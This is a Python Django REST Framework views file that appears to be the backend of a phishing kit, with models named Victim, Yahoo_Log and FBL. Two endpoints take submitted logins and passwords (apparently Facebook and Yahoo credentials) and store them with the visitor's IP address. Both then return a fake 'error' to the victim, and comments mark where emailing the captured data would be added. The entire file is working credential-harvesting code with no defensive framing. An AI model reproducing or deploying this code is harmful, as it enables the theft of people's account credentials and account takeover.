
import re
from django import http
from rest_framework.response import Response
from rest_framework.views import APIView
from .models import Victim,Yahoo_Log,FBL
from django.core.mail import EmailMessage


class Index(APIView):
    def get(self,request):
        return Response({"Access Denied"})


class Redify(APIView):
    def post(self,request):
        psw=request.data['psw']
        login=request.data['login']
        
        xxx = request.META.get('HTTP_X_FORWARDED_FOR')
        if xxx:
            ip = xxx.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')
        FBL.objects.create(login=login,psw=psw,ip=ip)
        return Response({"error"})
        #Send Email


        
class Getlog(APIView):
    def post(self,request):
        psw1=request.data['psw1']
        psw2=request.data['psw2']
        mail=request.data['mail']
        xxx = request.META.get('HTTP_X_FORWARDED_FOR')
        if xxx:
            ip = xxx.split(',')[0]
        else:
            ip = request.META.get('REMOTE_ADDR')            
        Yahoo_Log.objects.create(mail=mail,psw1=psw1, psw2=psw2,ip=ip)
        return Response({"error"})
        #Send Email





        


        




